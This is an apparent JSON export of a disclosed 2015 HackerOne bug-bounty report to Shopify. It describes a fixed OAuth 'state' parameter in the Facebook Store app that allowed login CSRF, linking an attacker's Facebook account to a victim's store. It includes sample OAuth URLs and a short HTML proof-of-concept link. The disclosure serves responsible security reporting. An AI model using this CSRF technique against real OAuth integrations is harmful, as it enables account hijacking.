{
    "abilities": {
        "can_manage_common_responses?": false, 
        "can_manage_collaborators?": false, 
        "can_reopen?": false, 
        "can_ban_researcher?": false, 
        "can_create_severity?": false, 
        "can_assign_to_h1_triage?": false, 
        "can_agree_on_going_public?": false, 
        "assignable_team_member_groups": [], 
        "can_view_credential_account_details?": false, 
        "can_export?": false, 
        "can_create_retest?": false, 
        "can_assign_to_user?": false, 
        "can_use_common_responses?": false, 
        "can_hide_timeline?": false, 
        "can_be_manually_disclosed?": false, 
        "assignable_team_members": [], 
        "can_clone?": false, 
        "can_be_publicly_disclosed?": false, 
        "can_close_comments?": false, 
        "can_view_bounty_weights?": false, 
        "can_suggest_bounty_amount?": false, 
        "can_cancel_disclosure_request?": false, 
        "can_redact?": false, 
        "can_change_structured_scope?": false, 
        "can_post_internal_comments?": false, 
        "can_change_state?": false, 
        "can_change_weakness?": false, 
        "can_add_comment?": false, 
        "can_reassign_to_team?": false, 
        "can_change_title?": false, 
        "can_award_bounty?": false, 
        "can_award_swag?": false, 
        "can_close?": false, 
        "can_manage?": false
    }, 
    "comments_closed?": false, 
    "substate": "resolved", 
    "bug_reporter_agreed_on_going_public_at": "2015-06-25T20:05:05.204Z", 
    "voters": [], 
    "facebook_team?": false, 
    "has_bounty?": true, 
    "bounty_amount": "500.0", 
    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
    "original_report_id": null, 
    "id": 55911, 
    "can_view_team": true, 
    "team_member_agreed_on_going_public_at": "2015-06-09T21:57:54.465Z", 
    "activity_page_count": 1, 
    "activity_page_number": 1, 
    "title": "CSRF token fixation in facebook store app that can lead to adding attacker to victim acc ", 
    "is_member_of_team?": null, 
    "vote_count": 0, 
    "summaries": [
        {
            "category": "team", 
            "can_create?": false, 
            "can_view?": true
        }, 
        {
            "category": "researcher", 
            "can_view?": true, 
            "can_edit?": false, 
            "id": 214, 
            "content": "haha sorry for the template @pranav_hivarekar:p ", 
            "content_html": "<p>haha sorry for the template <a href=\"/pranav_hivarekar\">@pranav_hivarekar</a>:p </p>\n"
        }
    ], 
    "structured_scope": null, 
    "allow_singular_disclosure_at": "2015-07-09T21:57:54.672Z", 
    "state": "Closed", 
    "cve_ids": [], 
    "readable_substate": "Resolved", 
    "public": true, 
    "formatted_bounty": "$500", 
    "singular_disclosure_disabled": true, 
    "activities": [
        {
            "automated_response": false, 
            "created_at": "2015-04-21T16:38:00.405Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-04-21T16:38:00.405Z", 
            "actor": {
                "username": "francoischagnon", 
                "url": "/francoischagnon", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/168/3b5130025fbf90eaeb1c9234baa340dfead68f44_medium.jpg?1429126005"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "Thanks, I managed to replicate the bug. Our team is investigating.", 
            "markdown_message": "<p>Thanks, I managed to replicate the bug. Our team is investigating.</p>\n", 
            "type": "Activities::BugTriaged", 
            "id": 386515, 
            "genius_execution_id": null
        }, 
        {
            "bounty_currency": "usd", 
            "automated_response": false, 
            "created_at": "2015-06-09T21:57:36.593Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-09T21:57:36.593Z", 
            "actor": {
                "url": "/shopify", 
                "profile": {
                    "name": "Shopify"
                }, 
                "ibb": false, 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
                }
            }, 
            "team_handle": "shopify", 
            "bounty_amount": "500.0", 
            "collaborator": {
                "username": "defmax", 
                "url": "/defmax"
            }, 
            "message": "This vulnerability has been fixed. Thanks for helping improve the security of Shopify!", 
            "markdown_message": "<p>This vulnerability has been fixed. Thanks for helping improve the security of Shopify!</p>\n", 
            "type": "Activities::BountyAwarded", 
            "id": 448261, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "reporter": {
                "username": "defmax", 
                "url": "/defmax"
            }, 
            "created_at": "2015-06-09T21:57:48.232Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-09T21:57:48.232Z", 
            "actor": {
                "username": "andrewdunbar", 
                "url": "/andrewdunbar", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::BugResolved", 
            "id": 448262, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-09T21:57:54.499Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-09T21:57:54.499Z", 
            "actor": {
                "username": "andrewdunbar", 
                "url": "/andrewdunbar", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/019/164/cd46f5270ea41c5f0da3bea93e2eca7a95858caf_medium.jpg?1427927985"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "first_to_agree": true, 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 448264, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-25T20:05:05.248Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-25T20:05:05.248Z", 
            "actor": {
                "username": "defmax", 
                "url": "/defmax", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/759/93d015b135539e28d7a64adf30f0d991b18b2177_medium.jpg?1514634048"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::AgreedOnGoingPublic", 
            "id": 491930, 
            "genius_execution_id": null
        }, 
        {
            "automated_response": false, 
            "created_at": "2015-06-25T20:05:05.553Z", 
            "is_internal": false, 
            "editable": false, 
            "updated_at": "2015-06-25T20:05:05.553Z", 
            "actor": {
                "username": "defmax", 
                "url": "/defmax", 
                "profile_picture_urls": {
                    "medium": "https://profile-photos.hackerone-user-content.com/000/002/759/93d015b135539e28d7a64adf30f0d991b18b2177_medium.jpg?1514634048"
                }, 
                "hackerone_triager": false
            }, 
            "team_handle": "shopify", 
            "message": "", 
            "markdown_message": "", 
            "type": "Activities::ReportBecamePublic", 
            "id": 491931, 
            "genius_execution_id": null
        }
    ], 
    "in_validation?": false, 
    "is_participant": false, 
    "singular_disclosure_allowed": true, 
    "reporter": {
        "username": "defmax", 
        "hacker_mediation": false, 
        "hackerone_triager": false, 
        "disabled": false, 
        "url": "/defmax", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/002/759/856264b97da4c7fa2ff42a8abb69905686083a95_small.jpg?1514634048"
        }, 
        "is_me?": false
    }, 
    "weakness": {
        "id": 57, 
        "name": "Violation of Secure Design Principles"
    }, 
    "is_external_bug": false, 
    "visibility": "full", 
    "allow_singular_disclosure_after": -107658149.5330431, 
    "disclosed_at": "2015-06-25T20:05:05.521Z", 
    "stage": 4, 
    "url": "https://hackerone.com/reports/55911", 
    "created_at": "2015-04-11T14:06:20.330Z", 
    "original_report_url": null, 
    "vulnerability_information_html": "<p>hey guys</p>\n\n<p>i just found  an csrf token  fixation in facebook store app  which is an offical  shopify app </p>\n\n<p>link &gt;&gt; <a title=\"https://docs.shopify.com/manual/more/official-shopify-apps/facebook-store\" href=\"/redirect?signature=14112693a85de2ada6839736013f8cc6a295c7de&amp;url=https%3A%2F%2Fdocs.shopify.com%2Fmanual%2Fmore%2Fofficial-shopify-apps%2Ffacebook-store\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://docs.shopify.com/manual/more/official-shopify-apps/facebook-store</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>The CSRF bug which connects attacker&#39;s Facebook account to victim&#39;s shopify  account. This is done by exploiting &#39;Connect with Facebook&#39; function.</p>\n\n<p>When using &#39;Connect with Facebook&#39; function. A request is sent to facebook to authorize the shopify app. After authorizing a &#39;access token&#39; is sent in response which shopify app verifies and connects the account. the verification is done by csrf  token &quot;state parameter &quot; </p>\n\n<p>here state parameter is getting fixed here </p>\n\n<p>1st oauth request </p>\n\n<p><a title=\"https://graph.facebook.com/oauth/authorize?client_id=410312912374011&amp;display=popup&amp;redirect_uri=https%3A%2F%2Ffacebookstore.shopifyapps.com%2Fauthenticated&amp;response_type=code&amp;scope=manage_pages+email&amp;state=c2f449f2df5ee64df6173702846bce72e3a57319\" href=\"/redirect?signature=8f6d718144e1a340abea93e2c50050b5e77f8e73&amp;url=https%3A%2F%2Fgraph.facebook.com%2Foauth%2Fauthorize%3Fclient_id%3D410312912374011%26display%3Dpopup%26redirect_uri%3Dhttps%253A%252F%252Ffacebookstore.shopifyapps.com%252Fauthenticated%26response_type%3Dcode%26scope%3Dmanage_pages%2Bemail%26state%3Dc2f449f2df5ee64df6173702846bce72e3a57319\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://graph.facebook.com/oauth/authorize?client_id=410312912374011&amp;display=popup&amp;redirect_uri=https%3A%2F%2Ffacebookstore.shopifyapps.com%2Fauthenticated&amp;response_type=code&amp;scope=manage_pages+email&amp;state=c2f449f2df5ee64df6173702846bce72e3a57319</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>then when it autorized , we will get this  get !</p>\n\n<p><a title=\"https://facebookstore.shopifyapps.com/authenticated?code=AQDdi9hS-WHa-jnVj3Cm63b_gc68E6vjm6xxoalbiwX0fmWtH91HdRI6vjkg2TmjGGJZcmQI4hHO1J8PC_CF7z5-vmxxaXjQQtBadOiwuYGPUrvpmsP2OkVAjFiLUzYDwn6O778zSz6Hb4nYlsW5OUz0QrdQLMY8aWTXKZnywzpQPz-Xx1q9DU4_mFotq7IaYgSvmbWDPNeM05FY4XCEKYIVKtB0Jpx2_hHG9ft_xXcAfh8sKnNzeEkgWrcGfqXnH-_h2EYvCB57gB0qj6ec7O-5SUlo6B4qPq4HywEqYaPXO2yj0npE9BkAJWjwCWMbeTw&amp;state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_\" href=\"/redirect?signature=559447d1eb24f9bcf0b3a1115a34739c0574643c&amp;url=https%3A%2F%2Ffacebookstore.shopifyapps.com%2Fauthenticated%3Fcode%3DAQDdi9hS-WHa-jnVj3Cm63b_gc68E6vjm6xxoalbiwX0fmWtH91HdRI6vjkg2TmjGGJZcmQI4hHO1J8PC_CF7z5-vmxxaXjQQtBadOiwuYGPUrvpmsP2OkVAjFiLUzYDwn6O778zSz6Hb4nYlsW5OUz0QrdQLMY8aWTXKZnywzpQPz-Xx1q9DU4_mFotq7IaYgSvmbWDPNeM05FY4XCEKYIVKtB0Jpx2_hHG9ft_xXcAfh8sKnNzeEkgWrcGfqXnH-_h2EYvCB57gB0qj6ec7O-5SUlo6B4qPq4HywEqYaPXO2yj0npE9BkAJWjwCWMbeTw%26state%3Dc2f449f2df5ee64df6173702846bce72e3a57319%23_%3D_\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>https://facebookstore.shopifyapps.com/authenticated?code=AQDdi9hS-WHa-jnVj3Cm63b_gc68E6vjm6xxoalbiwX0fmWtH91HdRI6vjkg2TmjGGJZcmQI4hHO1J8PC_CF7z5-vmxxaXjQQtBadOiwuYGPUrvpmsP2OkVAjFiLUzYDwn6O778zSz6Hb4nYlsW5OUz0QrdQLMY8aWTXKZnywzpQPz-Xx1q9DU4_mFotq7IaYgSvmbWDPNeM05FY4XCEKYIVKtB0Jpx2_hHG9ft_xXcAfh8sKnNzeEkgWrcGfqXnH-_h2EYvCB57gB0qj6ec7O-5SUlo6B4qPq4HywEqYaPXO2yj0npE9BkAJWjwCWMbeTw&amp;state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_</span><i class=\"icon-external-link\"></i></a></p>\n\n<p>now how many times you  autorize the state parameter will be same !  once the attacker gets state parameter by xss or any method , he can make csrf lifelong posible </p>\n\n<p>exploit code </p>\n<pre class=\"highlight html\"><code><span class=\"nt\">&lt;html&gt;</span>\n<span class=\"nt\">&lt;body&gt;</span>\n<span class=\"nt\">&lt;a</span> <span class=\"na\">href=</span><span class=\"s\">https://facebookstore.shopifyapps.com/authenticated?code=[[attacker_token</span> <span class=\"err\">]&amp;</span><span class=\"na\">state=</span><span class=\"s\">c2f449f2df5ee64df6173702846bce72e3a57319#_=_</span><span class=\"nt\">&gt;</span>\n<span class=\"nt\">&lt;/body&gt;</span>\n<span class=\"nt\">&lt;/html&gt;</span>\n</code></pre>\n<p>hope this bug will be fixed soon</p>\n", 
    "vulnerability_information": "hey guys\r\n\r\ni just found  an csrf token  fixation in facebook store app  which is an offical  shopify app \r\n\r\nlink >> https://docs.shopify.com/manual/more/official-shopify-apps/facebook-store\r\n\r\n\r\nThe CSRF bug which connects attacker's Facebook account to victim's shopify  account. This is done by exploiting 'Connect with Facebook' function.\r\n\r\nWhen using 'Connect with Facebook' function. A request is sent to facebook to authorize the shopify app. After authorizing a 'access token' is sent in response which shopify app verifies and connects the account. the verification is done by csrf  token \"state parameter \" \r\n\r\nhere state parameter is getting fixed here \r\n\r\n1st oauth request \r\n\r\nhttps://graph.facebook.com/oauth/authorize?client_id=410312912374011&display=popup&redirect_uri=https%3A%2F%2Ffacebookstore.shopifyapps.com%2Fauthenticated&response_type=code&scope=manage_pages+email&state=c2f449f2df5ee64df6173702846bce72e3a57319\r\n\r\nthen when it autorized , we will get this  get !\r\n\r\n\r\nhttps://facebookstore.shopifyapps.com/authenticated?code=AQDdi9hS-WHa-jnVj3Cm63b_gc68E6vjm6xxoalbiwX0fmWtH91HdRI6vjkg2TmjGGJZcmQI4hHO1J8PC_CF7z5-vmxxaXjQQtBadOiwuYGPUrvpmsP2OkVAjFiLUzYDwn6O778zSz6Hb4nYlsW5OUz0QrdQLMY8aWTXKZnywzpQPz-Xx1q9DU4_mFotq7IaYgSvmbWDPNeM05FY4XCEKYIVKtB0Jpx2_hHG9ft_xXcAfh8sKnNzeEkgWrcGfqXnH-_h2EYvCB57gB0qj6ec7O-5SUlo6B4qPq4HywEqYaPXO2yj0npE9BkAJWjwCWMbeTw&state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_\r\n\r\n\r\nnow how many times you  autorize the state parameter will be same !  once the attacker gets state parameter by xss or any method , he can make csrf lifelong posible \r\n\r\nexploit code \r\n\r\n```\r\n<html>\r\n<body>\r\n<a href=https://facebookstore.shopifyapps.com/authenticated?code=[[attacker_token ]&state=c2f449f2df5ee64df6173702846bce72e3a57319#_=_>\r\n</body>\r\n</html>\r\n```\r\n\r\nhope this bug will be fixed soon", 
    "team_private?": false, 
    "team": {
        "profile": {
            "website": "https://www.shopify.com", 
            "about": "Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between.", 
            "twitter_handle": "", 
            "name": "Shopify"
        }, 
        "handle": "shopify", 
        "url": "https://hackerone.com/shopify", 
        "state": "public_mode", 
        "profile_picture_urls": {
            "small": "https://profile-photos.hackerone-user-content.com/000/001/382/1e9872bf9cfe04008c2673e07bfecaa83858cca1_small.jpg?1532728703", 
            "medium": "https://profile-photos.hackerone-user-content.com/000/001/382/30421c25f4a7b03ec3250e36efb64f7291402806_medium.jpg?1532728703"
        }, 
        "awards_miles": false, 
        "permissions": [], 
        "id": 1382, 
        "default_currency": "usd"
    }, 
    "is_published": false
}